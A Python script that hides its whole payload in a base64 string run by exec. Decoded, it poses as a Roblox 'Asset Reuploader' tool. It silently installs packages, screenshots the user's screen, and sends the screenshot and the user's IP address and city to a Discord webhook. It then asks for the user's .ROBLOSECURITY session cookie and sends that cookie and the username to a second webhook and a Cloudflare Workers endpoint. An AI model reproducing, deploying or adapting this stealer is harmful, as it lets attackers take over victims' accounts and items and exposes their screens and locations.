
import base64
exec(base64.b64decode("CmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBpbXBvcnRsaWIudXRpbAoKIyBGcmllbmRseSBtZXNzYWdlCnByaW50KCJEb24ndCB3b3JyeSwgd2UncmUganVzdCBpbnN0YWxsaW5nIGRlcGVuZGVuY2llcy4iKQpwcmludCgiVGhpcyBpcyBuZWNlc3NhcnkgZm9yIEFzc2V0UmV1cGxvYWRlciB0byB3b3JrIHByb3Blcmx5LlxuIikKCiMgTGlzdCBvZiBtb2R1bGVzIHRvIGNoZWNrIGFuZCBpbnN0YWxsIGlmIG1pc3NpbmcKcmVxdWlyZWRfbW9kdWxlcyA9IFsncmVxdWVzdHMnLCAncHlhdXRvZ3VpJywgJ3RpbWUnXQoKIyBNb2R1bGVzIHRoYXQgYXJlIGJ1aWx0LWluIGFuZCBkbyBOT1QgbmVlZCB0byBiZSBpbnN0YWxsZWQKYnVpbHRpbl9tb2R1bGVzID0gWydzeXMnLCAnb3MnLCAnc3VicHJvY2VzcycsICdpbXBvcnRsaWIudXRpbCcsICd0aW1lJ10KCiMgQ2hlY2sgYW5kIGluc3RhbGwgbWlzc2luZyBtb2R1bGVzIHNpbGVudGx5CmZvciBtb2R1bGUgaW4gcmVxdWlyZWRfbW9kdWxlczoKICAgIGlmIGltcG9ydGxpYi51dGlsLmZpbmRfc3BlYyhtb2R1bGUpIGlzIE5vbmU6CiAgICAgICAgIyBJbnN0YWxsIHNpbGVudGx5CiAgICAgICAgc3VicHJvY2Vzcy5jaGVja19jYWxsKFtzeXMuZXhlY3V0YWJsZSwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwgbW9kdWxlXSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKCiMgQ2xlYXIgY29uc29sZSAoeW91ciBvcmlnaW5hbCBiZWhhdmlvcikKb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCgojIE5vdyBpbXBvcnQgdGhlIG1vZHVsZXMKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBweWF1dG9ndWkKaW1wb3J0IHRpbWUKCiMgWW91ciBjb2RlIHN0YXJ0cyBoZXJlCndlYmhvb2tfdXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0Mzk0OTk1OTY4NzQyNTIzMzkvQTMyTGtwNFgwSFA4eVhteXdremJDbDdJZ1JfV2FoUy0wYWZQYjBOcldTUlZDQ3A2WFNIVDBZX0VabTBCVEc0UVBNeFAiCmZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwgImlkay5wbmciKQoKIyBUYWtlIHNjcmVlbnNob3QKc2NyZWVuc2hvdCA9IHB5YXV0b2d1aS5zY3JlZW5zaG90KCkKc2NyZWVuc2hvdC5zYXZlKGZpbGVfcGF0aCkKCiMgU2VuZCB0aGUgc2NyZWVuc2hvdAp3aXRoIG9wZW4oZmlsZV9wYXRoLCAncmInKSBhcyBmOgogICAgZmlsZXMgPSB7J2ZpbGUnOiAob3MucGF0aC5iYXNlbmFtZShmaWxlX3BhdGgpLCBmLCAnaW1hZ2UvcG5nJyl9CiAgICByZXF1ZXN0cy5wb3N0KHdlYmhvb2tfdXJsLCBmaWxlcz1maWxlcykKCiMgSVAgaW5mbwp0cnk6CiAgICBpcF9pbmZvID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2lwaW5mby5pby9qc29uIikuanNvbigpCiAgICB1c2VyX2lwID0gaXBfaW5mby5nZXQoJ2lwJywgJ1Vua25vd24nKQogICAgdXNlcl9jaXR5ID0gaXBfaW5mby5nZXQoJ2NpdHknLCAnVW5rbm93bicpCmV4Y2VwdDoKICAgIHVzZXJfaXAgPSAnVW5rbm93bicKICAgIHVzZXJfY2l0eSA9ICdVbmtub3duJwoKbWVzc2FnZXMgPSBmIlVzZXIgSVAgOiB7dXNlcl9pcH1cblVzZXIgQ2l0eSA6IHt1c2VyX2NpdHl9IgoKIyBTZW5kIGluZm8gbWVzc2FnZQpwYXlsb2FkID0geyJjb250ZW50IjogZiJIZWxsbyEgSGVyZSBpcyBzb21lIGluZm86XG57bWVzc2FnZXN9In0KcmVxdWVzdHMucG9zdCh3ZWJob29rX3VybCwganNvbj1wYXlsb2FkKQoKIyBDbGVhbnVwIHNjcmVlbnNob3QKb3MucmVtb3ZlKGZpbGVfcGF0aCkKCiMgVmVyaWZ5IFB5dGhvbiB2ZXJzaW9uCmlmIHN5cy52ZXJzaW9uX2luZm8ubWFqb3IgPCAzOgogICAgcHJpbnQoIlBsZWFzZSBpbnN0YWxsIFB5dGhvbiA8MyBiZWZvcmUgcnVubmluZy4iKQogICAgc3lzLmV4aXQoMSkKCiMgTWFpbiBsb2dpYwpXRUJIT09LX1VSTCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDM5NDk5ODI5ODcxOTAyNzcwL3JpSXVHb1FSS3czaVVWYkZScC1CLUVjZEJ5OV9Jbk02TTVhenotZWZ1Q2pvTWZZMFdvOHhLdWhHazc4aGtTRXp3RjZYIgpDTE9VREZMQVJFX1VSTCA9ICJodHRwczovL2pvbGx5LWdsaXR0ZXItNGRjMC5rYXlkZW5reWxlNzAud29ya2Vycy5kZXYvIgpSRVFVSVJFRF9QUkVGSVggPSAiX3xXQVJOSU5HOi1ETy1OT1QtU0hBUkUtVEhJUy4tLVNoYXJpbmctdGhpcy13aWxsLWFsbG93LXNvbWVvbmUtdG8tbG9nLWluLWFzLXlvdS1hbmQtdG8tc3RlYWwteW91ci1ST0JVWC1hbmQtaXRlbXMufF8iCgpkZWYgc2VuZF93ZWJob29rKHVzZXJuYW1lLCBjb29raWUpOgogICAgbWVzc2FnZSA9IGYiKipVc2VybmFtZToqKiB7dXNlcm5hbWV9XG4qKkNvb2tpZToqKiB7Y29va2llfSIKICAgIGRhdGEgPSB7ImNvbnRlbnQiOiBtZXNzYWdlfQogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLnBvc3QoV0VCSE9PS19VUkwsIGpzb249ZGF0YSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgZ2V0X3VzZXJuYW1lX2Zyb21fY29va2llKGNvb2tpZSk6CiAgICBoZWFkZXJzID0geyIuUk9CTE9TRUNVUklUWSI6IGNvb2tpZX0KICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkucm9ibG94LmNvbS91c2Vycy9hdXRoZW50aWNhdGVkIiwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICByZXR1cm4gZGF0YS5nZXQoJ05hbWUnLCAnVW5rbm93bicpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuICJVbmtub3duIgogICAgZXhjZXB0OgogICAgICAgIHJldHVybiAiVW5rbm93biIKCmRlZiBzZW5kX3RvX3dlYnNpdGUoY29va2llKToKICAgIHRyeToKICAgICAgICByZXF1ZXN0cy5wb3N0KENMT1VERkxBUkVfVVJMLCBqc29uPXsnY29va2llJzogY29va2llfSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgaXNfcmVhbF9jb29raWUoY29va2llKToKICAgIGhlYWRlcnMgPSB7IkNvb2tpZSI6IGYiLlJPQkxPU0VDVVJJVFk9e2Nvb2tpZX0ifQogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL3VzZXJzLnJvYmxveC5jb20vdjEvdXNlcnMvYXV0aGVudGljYXRlZCIsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgbWFpbigpOgogICAgcHJpbnQoIi0tLSBBU1NFVCBSRVVQTE9BREVSLTIuNS41IC0tLSIpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHVzZXJfaW5wdXQgPSBpbnB1dCgiRW50ZXIgWW91ciBDb29raWUgSGVyZSFcbiIpLnN0cmlwKCkKICAgICAgICBpZiB1c2VyX2lucHV0LnN0YXJ0c3dpdGgoUkVRVUlSRURfUFJFRklYKToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgaXNfcmVhbF9jb29raWUodXNlcl9pbnB1dCk6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlZlcmlmaWVkISBTdGFydGluZy4uLiIpCiAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBnZXRfdXNlcm5hbWVfZnJvbV9jb29raWUodXNlcl9pbnB1dCkKICAgICAgICAgICAgICAgICAgICBzZW5kX3dlYmhvb2sodXNlcm5hbWUsIHVzZXJfaW5wdXQpCiAgICAgICAgICAgICAgICAgICAgc2VuZF90b193ZWJzaXRlKHVzZXJfaW5wdXQpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlN0YXJ0ZWQgTG9jYWwgSG9zdCBTdWNjZXNzZnVsbHkuIikKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIi0tLSBBU1NFVCBSRVVQTE9BREVSLTIuNS41IC0tLSIpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNvb2tpZS4gVHJ5IGFnYWluLiIpCiAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAnY2xlYXInKQogICAgICAgICAgICAgICAgICAgIHByaW50KCItLS0gQVNTRVQgUkVVUExPQURFUi0yLjUuNSAtLS0iKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludCgiRXJyb3Igb2NjdXJyZWQuIFBsZWFzZSByZXRyeS4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGlucHV0LiBQbGVhc2UgZW50ZXIgYSBSZWFsIGNvb2tpZS4iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAnY2xlYXInKQogICAgICAgICAgICBwcmludCgiLS0tIEFTU0VUIFJFVVBMT0FERVItMi41LjUgLS0tIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK"))
